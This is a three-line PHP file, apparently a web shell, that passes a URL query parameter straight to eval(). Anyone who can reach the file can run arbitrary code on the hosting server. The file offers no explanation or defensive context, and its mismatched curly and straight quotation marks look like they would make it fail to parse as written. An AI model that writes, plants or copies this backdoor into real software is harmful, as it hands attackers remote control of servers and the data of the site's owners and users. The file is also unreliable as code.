<?php
eval($_GET[’BU8RqEhQ']);
?>
